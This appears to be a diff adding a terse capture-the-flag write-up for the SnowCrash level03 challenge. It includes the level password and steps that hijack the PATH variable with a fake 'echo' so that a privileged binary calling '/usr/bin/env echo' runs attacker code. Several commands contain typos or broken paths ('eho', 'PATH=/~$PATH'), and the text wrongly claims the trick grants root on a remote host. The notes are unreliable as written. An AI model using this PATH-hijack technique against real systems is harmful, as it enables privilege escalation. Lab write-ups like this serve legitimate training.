@@ -1,0 +1,30 @@
+# loging into level03 first 
+
+	su: Authentication failure
+	level03@SnowCrash:~$ su level03
+	Password: kooda2puivaav1idi4f57q8iq
+
+# finding a executable file 
+
+trying to execute it and a message just appear Exploit me
+
+using ltrace we are going to find system("/usr/bin/env echo exploit me : exploit me 
+
+means that we can  to manipulate $PATH variable” to gain root access of a remote host machine 
+
+	which getflag "/bin/getflag"
+
+	vim echo 
+	chmod 777 eho 
+	echo $PATH 
+	export PATH=/~$PATH
+	pwd
+	export PATH=//home/user/level03:$PATH
+	./level03
+
+PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored.
+hen the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.
+
+It is very simple to view the Path of the relevant user with help of echo command.
+
+
